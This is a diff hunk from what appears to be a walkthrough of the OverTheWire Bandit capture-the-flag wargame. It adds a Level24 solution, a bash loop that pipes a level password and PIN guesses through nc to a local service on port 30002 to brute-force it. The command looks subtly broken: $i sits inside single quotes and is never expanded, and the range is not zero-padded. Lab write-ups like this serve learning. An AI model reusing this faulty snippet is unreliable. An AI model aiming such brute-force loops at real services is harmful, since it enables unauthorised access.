@@ -251,7 +251,7 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 #### [+] Level24
 ```
-
+bandit24@bandit:~$ for i in {1..9999};do echo $i;echo -e 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i' | timeout 0.6 nc localhost 30002;done
 ```
 #### [+] Level25
 ```
